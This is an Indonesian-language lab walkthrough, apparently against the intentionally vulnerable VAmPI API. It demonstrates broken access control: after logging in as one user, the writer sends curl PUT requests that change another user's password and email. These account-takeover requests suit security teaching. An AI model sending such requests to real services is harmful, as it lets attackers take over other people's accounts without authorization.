# Unauthorized Password Change
Access Control menerapkan kebijakan sedemikian rupa sehingga pengguna tidak dapat bertindak di luar izin yang dimaksudkan. Kegagalan otorisasi biasanya menyebabkan pengungkapan informasi yang tidak sah, modifikasi, penghapusan data atau pelaksanaan fungsi bisnis lain di luar batas pengguna. Misalnya adalah mengizinkan melihat atau mengedit akun orang lain, dengan memberikan pengenal uniknya (insecure direct object references)

- Login terlebih dahulu untuk mengakses endpoint `/users/v1/{username}/password` dengan akun yang sudah dibuat di proses instalasi kemudian copy nilai `auth_token`
```sh
curl http://IP_Server:5000/users/v1/login -d '{"username":"userapi","password":"12345"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%201.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%202.JPG)

- Setelah kita login sebagai user `userapi` sekarang kita coba mengubah password user `name1` melalui endpoint `/users/v1/{username}/password`
```sh
curl -X PUT http://IP_Server:5000/users/v1/name1/password -d '{"password":"testing"}' -H 'Authorization: Bearer token' -H 'Content-Type: application/json' -H "Accept: application/json" --proxy http://127.0.0.1:8080 -v
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%204.JPG)

- Dari percobaan diatas, terlihat bahwa sistem memberi respon HTTP code 204 yang artinya request pengubahan password user `name1` telah berhasil dilakukan
- Di sisi lain kita juga bisa mengubah email user `name1` melalui endpoint `/users/v1/{username}/email`. Jika `auth_token` sudah expire, anda harus melakukan login kembali dan copy value `auth_token` yang baru
```sh
curl -X PUT http://IP_Server:5000/users/v1/name1/email -d '{"email":"testing@mail.com"}' -H 'Authorization: Bearer token' -H 'Content-Type: application/json' -H "Accept: application/json" --proxy http://127.0.0.1:8080 -v
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%205.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/unathorized%20password%20change/unauthorized%206.JPG)

- Dari percobaan diatas, terlihat bahwa sistem memberi respon HTTP code 204 yang artinya request pengubahan email user `name1` telah berhasil dilakukan
- Dari serangkaian percobaan diatas, dapat kita simpulkan bahwa kita bisa mengubah password dan email dari user apapun tanpa harus login sebagi user yang bersangkutan. Inilah yang disebut dengan celah keamanan Broken Access Control